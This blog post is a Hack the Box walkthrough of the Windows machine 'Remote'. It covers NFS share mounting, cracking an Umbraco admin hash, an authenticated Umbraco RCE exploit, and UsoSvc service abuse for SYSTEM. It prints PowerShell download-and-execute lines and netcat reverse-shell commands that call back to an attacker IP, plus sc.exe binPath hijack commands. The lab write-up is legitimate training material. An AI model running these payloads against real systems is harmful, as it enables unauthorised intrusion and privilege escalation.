+++
author = "Nick"
categories = ["hack the box", "easy", "windows", "authenticated rce", "umbraco", "john", "showmount", "rpcbind", "sdf", "netcat", "PowerUp", "usosvc"]
date = 2020-09-05T15:26:34Z
description = ""
draft = false
thumbnail = "/images/2020/04/info-1.png"
slug = "hack-the-box-remote"
summary = "Welcome back everyone! Today we will be doing the Hack the Box machine, Remote. This is a Windows machine listed as an Easy difficulty. Let's jump in"
tags = ["hack the box", "easy", "windows", "authenticated rce", "umbraco", "john", "showmount", "rpcbind", "sdf", "netcat", "PowerUp", "usosvc"]
title = "Hack the Box - Remote"

+++


Welcome back everyone! Today we will be doing the Hack the Box machine, Remote. This is a Windows machine listed as an Easy difficulty. Let's jump in!

As always, we start out with `nmap`: `nmap -sC -sV -p- -oA allscan 10.10.10.180`

Here are our results:
```
Nmap scan report for 10.10.10.180
Host is up (0.044s latency).
Not shown: 65519 closed ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m50s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-20T15:32:32
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.34 seconds
```

We see some standard ports, the most apealing being 21. So we'll start there. We log in, but nothing is there. We aren't able to upload anything either. Ok, onto the web interface. Let's see what we have there.

Once the pages loads, we see a basic website. While browsing the source, we see an interesting TODO note:

![](/images/2020/04/image-50.png)

We add these to the end of our URL to see if a site might be live on it or not. Sure enough `umbraco` is a site that is live. It brings us to a login page.

![](/images/2020/04/image-51.png)

A quick google tells us the `Umbraco` [is a CMS](https://umbraco.com/). We do a `searchsploit` for `Umbraco` and we get some hits.

Command:
`searchsploit umbraco`

![](/images/2020/04/image-52.png)

Since there are only three results, we'll try the two that make sense. The first is a `Metasploit` module. When we launch the module, we see it targets version 4.7xx. It's pretty unlikley that this will work but we run it anyway. Nothing. Next up is the SeoChecker Plugin vuln. We can check to see if this is going to work for us as well. To do that we'll simply view the referenced text file.

Command:
`cat $(locate 44988.txt)`

We see there is a date of 1/7/2018, so that's good, recent. The downside is that it is also an `Authenticated` attack. Looks like we'll need to find some creds somewhere. We'll kick off a `gobuster` and see what we can find.

Command:
`gobuster dir -u http://10.10.10.180 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php`

![](/images/2020/04/image-53.png)

We get a long list of pages due to the numbered entries. We do see one that stands out right away, `install`. We navigate to the page and it simply redirects us to the `Umbraco` login. 

Well, now is the time to start looking at other ports. Ports 111 and 2049 are apealing as well.  When we see port 2049 with `mountd` listed, we can, generally,  use `showmount` to determine if there's anything mounted using NFS or not.

Command:
`showmount -e 10.10.10.180`

![](/images/2020/04/image-54.png)

We do indeed see a share listed. Now we want to mount that remote share. To do this we will use `mount`, more on this command [here](hhttps://www.tutorialspoint.com/unix_commands/mount.htm).

Command:
`mount -t nfs 10.10.10.180:/site_backups ./mnt`

![](/images/2020/04/image-55.png)

Once we've done that, we should have access to the remote share in our local `./mnt` directory.

![](/images/2020/04/image-56.png)

Now we can start sifting through the machine for interesting content. Since the mount was called `site_backsup`, I'm going to start with `Umbraco` named directories and see what we can find. Searching around the internet lead me to this [interesting QA](https://our.umbraco.com/forum/getting-started/installing-umbraco/35554-Where-does-Umbraco-store-usernames-and-passwords). They note a path of App_Data/Umbraco.sdf. This would imply that the `.sdf` has credentials inside it. 

Looking up the `.sdf` file shows it's a "relational database saved in the SQL Server Compact (SQL CE) format". There are a few ways to read the file: Visual Stuio, LINQpad and some others. But before I try that, I always just try `cat` and / or `strings` the file for visible data. In this case, it pays off.

![](/images/2020/04/image-57.png)

We get some good information. We have a username (smith)smith (also shown as ssmith in the file), admin as well as a hash for the admin.

```
admin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.local
```

Looks like we'll put this hash into a file called `admin.hash` and feed it into `john` with `rockyou` and see what comes back.

Command:
`john admin.hash -w=/usr/share/wordlists/rockyou.txt`

![](/images/2020/04/remote_adminhash.gif)

We get back a password of `baconandcheese`. Now we can log into the webinterface as admin and potentially use some one of our exploits from earlier. We head over and log in sucessfully!

Now we need to verify our software version. The little question mark gives us the details right way, version 7.12.4

![](/images/2020/04/image-58.png)

Our earlier `searchsploit` showed this exact verion, perfect! Let's copy the exploit to our working directory in case we need to edit it.

Command:
`searchsploit -m 46153 .`

Now we can take a look at the code and customize it if need be. We need to modify `login`, `password`,`host`, `string cmd` as well as the `proc.StartInfo.FileName` inside the exploit.

We need to make a temporary directory, download netcat.exe, create a netcat listen on our system and launch a netcat reverse shell from the target.

I'll move to my local `Tools` directory and start a `SimpleHTTPServer` so I can download my hosted `netcat.exe`.

Command from netcat location:
`python -m SimpleHTTPServer 80`

In this case we're leveraging `Powershell` to do what we ask. So we set our `proc.StartInfo.FileName` to `Powershell.exe`.

Next we need to create a payload string for our above requirements. When creating a payload, making it shorter is helpful. Since we're using powershell, I'll check locally for any aliases for `Invoke-WebRequest`.

Command:
`PS> gal -Definition Invoke-WebRequest`

![](/images/2020/04/image-60.png)

On my current VM hosting system, we have a few alias', we'll try some in this string. Ultimately the string I can up with is as follows:

`mkdir /rfio;wget 10.10.14.41/nc.exe -outfile /rfio/nc.exe;/rfio/nc.exe 10.10.14.41 4242 -e powershell`

Here's the breakdown:
`mkdir /rfio` makes a new directory called rfio.
`wget` lets us download a file of our choice.
`nc.exe 10.10.14.41 4242 -e powershell` executes our netcat command.

Our final modified code looks like this:

![](/images/2020/04/image-61.png)

Next we set up our local `netcat` listener.

Command:
`nc -lvnp 4242`

Now we launch the exploit!

![](/images/2020/04/remoteshell.gif)

We get a shell back as the service! We start to look around and see there is only one real account, Administrator. We see the `user.txt` file in the Public directory. Nice, one flag down! 

Now that we have a foothold, we'll download `winPEAS` or `PowerUp.ps1` from our tools and start some internal enumeration. For some reason my `winPEAS` was not returning a potential vector I could see manually, so we'll use `PowerUp.ps1`, which did show it.

Command:
`wget 10.10.14.41/PowerUp.ps1 -outfile ./PowerUp.ps1`

Next we'll start our `PowerShell` session with `ExecutionPolicy` set to bypass.

Command:
`Powershell -ep bypass`

Now we'll import PowerUp.ps1

Command:
`import-module PowerUp.ps1`

And start some checks.

Command:
`invoke-allchecks`

![](/images/2020/04/remotesvc.gif)

We see that `UsoSvc` is capable of being exploited, just like in previous boxes! Check out [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md) to see how we leverage this.

So now we can abuse this service in conjunction with our previous `netcat` binary we uploaded to gain system. PowerUp even has a built in function for this: `Invoke-ServiceAbuse`.

First we'll need to start a local `netcat` listener again, this time on a new port.

Command:
`nc -lvnp 6969`

Now we can use the abuse function.

Command:
`invoke-serviceabuse -Name 'UsoSvc' -command 'C:\rfio\nc.exe -e cmd.exe 10.10.14.41 6969`

We can also do it the manual way.

Commands:
`sc.exe config usosvc binPath="C:\rfio\nc.exe 10.10.14.41 7777 -e powershell.exe"`
`sc.exe stop usosvc`
`sc.exe start usosvc`

![](/images/2020/04/remoteroot.gif)

We now have a shell as System! We head over to the Administrator Desktop and grab our flag!

Think about sending me some respect over on HTB if you enjoyed the write-up! Here's my [profile](https://www.hackthebox.eu/home/users/profile/95635).



